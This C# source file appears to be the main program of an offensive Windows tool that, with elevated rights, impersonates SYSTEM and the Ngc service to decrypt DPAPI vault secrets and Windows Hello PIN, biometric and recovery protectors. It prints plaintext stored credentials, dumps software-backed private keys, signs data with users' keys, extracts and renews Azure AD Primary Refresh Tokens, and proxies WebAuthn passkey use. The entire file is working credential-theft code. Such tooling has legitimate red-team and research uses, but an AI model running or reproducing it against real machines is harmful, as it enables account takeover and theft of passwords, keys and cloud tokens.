﻿using System;
using DPAPI;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Text;
using NtApiDotNet;
using Shwmae.Ngc.Keys;
using Shwmae.Ngc.Protectors;
using Shwmae.Ngc;
using Shwmae.Vault;
using System.Linq;
using CommandLine;

namespace Shwmae {
    internal class Program {

        static bool verbose = false;

        static void Enumerate(IEnumerable<NgcContainer> ngcContainers, IMasterKeyProvider machineKeyProvider, IMasterKeyProvider systemKeyProvider, IEnumerable<DecryptedCredential> decryptedVaultCreds,
            string pin, string accessToken) {

            NgcProtector ngcKeySet = null;
            byte[] recoveryPinAesKey = null;

            foreach (var ngcContainer in ngcContainers) {

                Console.WriteLine($"\n{ngcContainer.Sid.Name} ({ngcContainer.Sid})\n");
                Console.WriteLine($"  Container Id          : {ngcContainer.Id}");
                Console.WriteLine($"  Provider              : {ngcContainer.Provider}");

                if (ngcContainer.RecoveryKey != null) {
                    Console.WriteLine($"  Protected Recovery Key: {(verbose ? ngcContainer.RecoveryKey : ngcContainer.RecoveryKey.Substring(0, 30) + "...")}");

                    if (accessToken != null) {

                        try {
                            recoveryPinAesKey = ngcContainer.DecryptRecoveryKey(accessToken, machineKeyProvider);
                            Console.WriteLine($"  Recovery Key          : {recoveryPinAesKey.Hex()}");
                        } catch (Exception e) {
                            Console.WriteLine($"  Recovery Key          : False {e.Message}");
                        }

                    } else {
                        Console.WriteLine($"  Recovery Key          : Use --recovery-token argument to decrypt recovery key");
                    }
                }

                Console.WriteLine();
                Console.WriteLine("  ** Protectors **");

                foreach (var protector in ngcContainer.Protectors) {
                    Console.WriteLine();
                    Console.WriteLine($"    Type           : {protector.ProtectorType}");

                    if (protector is PinProtector pinProtector) {
                        Console.WriteLine($"    Pin Type       : {pinProtector.PinType}");
                        Console.WriteLine($"    Length         : {(pinProtector.PinType == PinType.Numeric ? pinProtector.PinLength.ToString() : "Unknown")}");

                        if (pinProtector.IsSoftware) {
                            pinProtector.ProcessSoftwareKey(systemKeyProvider);
                            Console.WriteLine($"    Hash           : {pinProtector.Hash}");
                            if (pinProtector.PinType == PinType.Numeric) {
                                Console.WriteLine($"    Mask           : {"?d".Repeat((uint)pinProtector.PinLength)}");
                            }
                        }

                        if (pin != null) {
                            try {
                                protector.Decrypt(Encoding.Unicode.GetBytes(pin));
                                Console.WriteLine($"    Decrypted      : True (PIN Correct)");
                                Console.WriteLine($"    ExtPin         : {protector.ExternalPin.Hex()}");
                                Console.WriteLine($"    DecryptPin     : {protector.DecryptPin.Hex()}");
                                Console.WriteLine($"    SignPin        : {protector.SignPin.Hex()}");
                                ngcKeySet = protector;
                            } catch (CryptographicException ce) {
                                Console.WriteLine($"    Decrypted      : {ce.Message}");
                            }
                        } else {
                            Console.WriteLine($"    Decrypted      : Supply /pin argument to attempt decryption");
                        }

                    } else if (protector is BioProtector bioProtector) {

                        Console.WriteLine($"    Encryption Type: {bioProtector.BioEncryptionType}");
                        if (bioProtector.BioEncryptionType == BioEncryptionType.Aes) {
                            Console.WriteLine($"    GCM Nonce      : {bioProtector.AesNonce.Hex()}");
                            Console.WriteLine($"    GCM AuthData   : {bioProtector.AesAuthData.Hex()}");
                            Console.WriteLine($"    GCM Tag        : {bioProtector.AesTag.Hex()}");

                            foreach (var bioKey in decryptedVaultCreds.Where(dc => dc is BioCredential && dc.Identity == bioProtector.User.Sid)) {
                                try {
                                    bioProtector.Decrypt(((BioCredential)bioKey).ProtectorKey);
                                    Console.WriteLine($"    Decrypted      : True (Bio Key Correct)");
                                    Console.WriteLine($"    ExtPin         : {bioProtector.ExternalPin.Hex()}");
                                    Console.WriteLine($"    DecryptPin     : {bioProtector.DecryptPin.Hex()}");
                                    Console.WriteLine($"    SignPin        : {bioProtector.SignPin.Hex()}");
                                    ngcKeySet = protector;
                                } catch (CryptographicException ce) {
                                    Console.WriteLine($"    Decrypted      : False: ({ce.Message})");
                                }
                            }
                        }
                    } else if (protector is RecoveryProtector rp) {

                        Console.WriteLine($"    IV             : {rp.IV.Hex()}");

                        try {
                            if (recoveryPinAesKey != null) {
                                rp.Decrypt(recoveryPinAesKey);
                                Console.WriteLine($"    Decrypted      : True (Recovery Key Correct)");
                                Console.WriteLine($"    ExtPin         : {rp.ExternalPin.Hex()}");
                                Console.WriteLine($"    DecryptPin     : {rp.DecryptPin.Hex()}");
                                Console.WriteLine($"    SignPin        : {rp.SignPin.Hex()}");
                            }
                        } catch (CryptographicException ce) {
                            Console.WriteLine($"    Decrypted      : False: {ce.Message}");
                        }
                    }
                }


                Console.WriteLine("\n  ** Credentials **");

                var ngcVaultKey = ngcContainer.Keys.FirstOrDefault(k => k != null && k.Name == "//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F");

                if (ngcVaultKey == null) {
                    Console.WriteLine("    No vault key available with ID //9DDC52DB-DC02-4A8C-B892-38DEF4FA748F");
                    continue;
                }

                foreach (var vaultKey in decryptedVaultCreds.Where(dc => dc.Identity == ngcContainer.Sid)) {

                    Console.WriteLine();
                    Console.WriteLine($"    Resource         : {vaultKey.Resource}");
                    Console.WriteLine($"    SID              : {vaultKey.Identity}");

                    if (vaultKey is NgcCredential ngcVaultCred) {
                        try {
                            if (ngcKeySet != null) {
                                var aesKey = ngcVaultKey.Decrypt(ngcVaultCred.EncData, new NgcPin(ngcKeySet.DecryptPin), systemKeyProvider);
                                var plaintextCred = Encoding.Unicode.GetString(Utils.AesDecrypt(ngcVaultCred.EncPassword, aesKey, ngcVaultCred.IV)).Replace("\0", "");
                                Console.WriteLine($"    Credential       : {plaintextCred}");
                            } else {
                                Console.WriteLine($"    Credential       : No NGC key set has been decrypted for this user, cannot decrypt vault credential");
                            }
                        } catch (CryptographicException) { }

                    } else if (vaultKey is BioCredential bioCred) {
                        Console.WriteLine($"    Protector Key    : {bioCred.ProtectorKey.Hex()}");
                    }
                }

                Console.WriteLine("\n  ** Keys **");

                foreach (var ngcKey in ngcContainer.Keys) {

                    if (ngcKey == null)
                        continue;

                    Console.WriteLine();
                    Console.WriteLine($"    Name             : {ngcKey.Name}{(ngcKey.Name == "//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F" ? " (Vault Key)" : "")}");
                    Console.WriteLine($"    Provider         : {ngcKey.Provider}");
                    Console.WriteLine($"    Key Id           : {ngcKey.KeyId}");
                    Console.WriteLine($"    Key File         : {( ngcKey.KeyPath != null ? Path.GetFileName(ngcKey.KeyPath) : "(missing)")}");

                    if (ngcKey is NgcPassKey passKey) {
                        Console.WriteLine($"    FIDO Relay Party : {passKey.RpId}");
                        Console.WriteLine($"    FIDO Public Key  : {Utils.Base64Url(passKey.PublicKey)}");
                        Console.WriteLine($"    FIDO Cred Id     : {Utils.Base64Url(passKey.CredentialId)}");
                        Console.WriteLine($"    FIDO User Id     : {Utils.Base64Url(passKey.UserId)}");
                        Console.WriteLine($"    FIDO User        : {passKey.UserName}");
                        Console.WriteLine($"    FIDO Display Name: {passKey.DisplayName}");
                        Console.WriteLine($"    FIDO Sign Count  : {passKey.SignCount}");
                    } else if (ngcKey is AzureADKey aadKey) {
                        Console.WriteLine($"    Azure Tenant Id  : {aadKey.TenantId}");
                        Console.WriteLine($"    Azure User       : {aadKey.Email}");
                        Console.WriteLine($"    Azure kid        : {aadKey.AzureKid}");
                    }
                }
            }
        }

        static void PrintPRTInfo(AzureADKey aadKey) {

            Console.WriteLine($"    Transport Key    : {aadKey.TransportKeyName}");

            if (aadKey.PRT != null) {
                var prtFile = $"{aadKey.Email}-{aadKey.TenantId}.prt";
                File.WriteAllText(prtFile, aadKey.PRT);
                Console.WriteLine($"    PRT              : {aadKey.PRTRefreshToken}");
                Console.WriteLine($"    PRT Session Key  : {Utils.Base64Url(aadKey.EncryptedPopSessionKey)}");
                Console.WriteLine($"    PRT Random Ctx   : {aadKey.Ctx.Hex()}");
                Console.WriteLine($"    PRT Derived Key  : {aadKey.DerivedSessionKey.Hex()}");
            }

            if (aadKey.PartialTGT != null) {
                Console.WriteLine($"    Partial TGT      :\n {aadKey.PartialTGT}");
            }
        }

  
        static void Run(object options) {

            BaseOptions baseOptions = (BaseOptions)options;

            if ((baseOptions.PIN != null || baseOptions.RecoveryToken != null) && baseOptions.SID == null && baseOptions is EnumOptions) {
                Console.WriteLine("[!] When pin or token is used the sid argument is needed to target a specific user");
                return;
            }

            if (baseOptions.Verbose)
                verbose = true;

            IMasterKeyProvider systemKeyProvider;
            IMasterKeyProvider machineKeyProvider;
            DecryptedCredential[] decryptedVaultCreds;
            RSACng deviceKey = null;
            X509Certificate2 deviceCert = null;
            WebAuthnHttpListener listener = null;

            if (!NtToken.EnableDebugPrivilege()) {
                Console.WriteLine("[!] Failed to enable debug privileges, are you elevated?");
                return;
            }
            
            using (var ctx = Utils.Impersonate("SYSTEM")) {

                if (baseOptions.SystemDPAPI == null) {
                    systemKeyProvider = new MasterKeyProviderSystemUser();
                } else {
                    systemKeyProvider = new MasterKeyProviderSystemUser(baseOptions.SystemDPAPI.FromHex());
                }

                if(baseOptions.MachineDPAPI == null) { 
                    machineKeyProvider = new MasterKeyProviderLocalMachine();
                } else {                   
                    machineKeyProvider = new MasterKeyProviderLocalMachine(baseOptions.MachineDPAPI.FromHex());
                }

                var vaultPolicy = new Policy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol"));
                var masterKey = systemKeyProvider.GetMasterKey(vaultPolicy.PolicyKey.GuidMasterKey);
                Console.WriteLine($"[+] Decrypted SYSTEM vault policy {vaultPolicy.VaultId} key: {masterKey.Key.Hex()}");
                vaultPolicy.Decrypt(masterKey);
                Console.WriteLine($"[+] Decrypted vault policy: ");
                Console.WriteLine($"  Aes128: {vaultPolicy.Aes128Key.Hex()}");
                Console.WriteLine($"  Aes256: {vaultPolicy.Aes256Key.Hex()}");

                decryptedVaultCreds = Credential.GetCredentials(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28"))
                   .Select(cred => cred.Decrypt(vaultPolicy))
                   .ToArray();

                try {
                    deviceCert = AzureADKey.FindDeviceCert();
                    if (deviceCert != null)
                        deviceKey = deviceCert.GetRSAPrivateKey() as RSACng;
                }catch(CryptographicException ce) {
                    Console.WriteLine($"[!] Failed to load Azure device key: {ce.Message}");
                }

                if (baseOptions is WebAuthnOptions webAuthnOptions) {
                    listener = new WebAuthnHttpListener(webAuthnOptions.Port);
                    listener.Start();
                }
            }

            using (var ctx = Utils.Impersonate("Ngc")) {

                var ngcContainers = NgcContainer.GetAll();

                if (baseOptions.SID != null) {
                    ngcContainers = ngcContainers.Where(c => c.Sid == Sid.Parse(baseOptions.SID));
                }

                if (baseOptions is EnumOptions) {
                    Enumerate(ngcContainers, machineKeyProvider, systemKeyProvider, decryptedVaultCreds, baseOptions.PIN, baseOptions.RecoveryToken);

                } else if (baseOptions is WebAuthnOptions wano) {

                    listener.PIN = baseOptions.PIN;
                    listener.DecryptedCredentials = decryptedVaultCreds;
                    listener.Containers = ngcContainers;

                    Console.WriteLine("[=] WebAuthn proxy running, press enter to exit");
                    Console.ReadLine();

                }else if (baseOptions is KeyOptions keyOptions) {
 
                    var container = ngcContainers
                        .Where(ngcc => ngcc.Keys.Any(k => k.Name == keyOptions.KeyName))
                        .FirstOrDefault();

                    if (container == default) {
                        Console.WriteLine($"[!] Could not find key with name {keyOptions.KeyName} in any of the NGC containers");
                        return;
                    }

                    Console.WriteLine($"[=] Found key in container {container.Id} for user {container.Sid.Name} ({container.Sid})");

                    var protector = container.GetFirstDecryptedProtector(baseOptions.PIN, decryptedVaultCreds, systemKeyProvider);

                    if (protector == null) {
                        Console.WriteLine($"[!] Could not decrypt any of the protectors for account {container.Sid.Name}, provide pin argument to decrypt primary pin protector");
                        return;
                    }

                    Console.WriteLine($"[+] Successfully decrypted NGC key set from protector type {protector.ProtectorType}");

                    var key = container.Keys.First(k => k.Name == keyOptions.KeyName);

                    if (keyOptions is SignOptions signOptions) {

                        byte[] signedData;

                        try {
                            signedData = key.Sign(Encoding.UTF8.GetBytes(signOptions.Data), new NgcPin(protector.SignPin), machineKeyProvider, HashAlgorithmName.SHA256);
                        } catch (CryptographicException) {
                            signedData = key.Sign(Encoding.UTF8.GetBytes(signOptions.Data), new NgcPin(protector.ExternalPin), machineKeyProvider, HashAlgorithmName.SHA256);
                        }

                        Console.WriteLine($"[+] Success:\n{Convert.ToBase64String(signedData)}");

                    }else if(keyOptions is DumpOptions) {

                        if(!key.IsSoftware) {
                            Console.WriteLine($"[!] Cannot dump key with id {key.Name} as it's backed by TPM");
                            return;
                        }

                        byte[] keyData;

                        try {
                            keyData = key.Dump(new NgcPin(protector.SignPin), systemKeyProvider);
                        } catch (CryptographicException) {
                            try {
                                keyData = key.Dump(new NgcPin(protector.DecryptPin), systemKeyProvider);
                            }catch(CryptographicException) {
                                try {
                                    keyData = key.Dump(new NgcPin(protector.ExternalPin), systemKeyProvider);
                                }catch(CryptographicException ce) {
                                    Console.WriteLine($"[!] Failed to dump key with id {key.Name}, none of the intermediate PIN's worked");
                                    return;
                                }
                            }
                        }

                        Console.WriteLine("-----BEGIN PRIVATE KEY-----");
                        Console.WriteLine(Convert.ToBase64String(keyData, Base64FormattingOptions.InsertLineBreaks));
                        Console.WriteLine("-----END PRIVATE KEY-----");
                    }

                } else if (baseOptions is PrtOptions prtOptions) {

                    if (baseOptions.SID == null) {
                        Console.WriteLine("[!] sid argument needs to be supplied to fetch a PRT");
                        return;
                    }

                    var container = ngcContainers
                        .Where(ngcc => ngcc.Sid.ToString() == baseOptions.SID && ngcc.Keys.Any(k => (k is AzureADKey)))
                        .FirstOrDefault();

                    if (container == default) {
                        Console.WriteLine($"[!] Could not find Azure certificate for user with SID {baseOptions.SID}");
                        return;
                    }

                    var aadKey = (AzureADKey)container.Keys.First(k => k is AzureADKey);


                    if (prtOptions.Renew) {

                        if(prtOptions.SessionKey == null || prtOptions.PRT == null) {
                            Console.WriteLine("[!] Both session-key and prt argument required to renew");
                            return;
                        }

                        ctx.Revert();
                        aadKey.RenewPRT(prtOptions.SessionKey, prtOptions.PRT, prtOptions.KDFv1);
                        PrintPRTInfo(aadKey);

                    } else {
                
                        Console.WriteLine($"[=] Found Azure key with UPN {aadKey.Email} and kid {aadKey.AzureKid}");

                        var protector = container.GetFirstDecryptedProtector(baseOptions.PIN, decryptedVaultCreds, systemKeyProvider);

                        if (protector == null) {
                            Console.WriteLine($"[!] Could not decrypt any of the protectors for account {container.Sid.Name}, provide pin argument to decrypt primary pin protector");
                            return;
                        }

                        Console.WriteLine($"[+] Successfully decrypted NGC key set from protector type {protector.ProtectorType}");

                        ctx.Revert();
                        using (var systemCtx = Utils.Impersonate("SYSTEM")) {
                            aadKey.GetPRT(protector, systemKeyProvider, deviceKey, deviceCert, prtOptions.KDFv1);          
                        }
                        PrintPRTInfo(aadKey);
                    }
                }
            }
        }

        static void Main(string[] args) {
            Parser.Default.ParseArguments(args, new Type[] { typeof(EnumOptions), typeof(SignOptions), typeof(PrtOptions), typeof(WebAuthnOptions), typeof(DumpOptions) })
                .WithParsed(Run);               
        }
    }
}
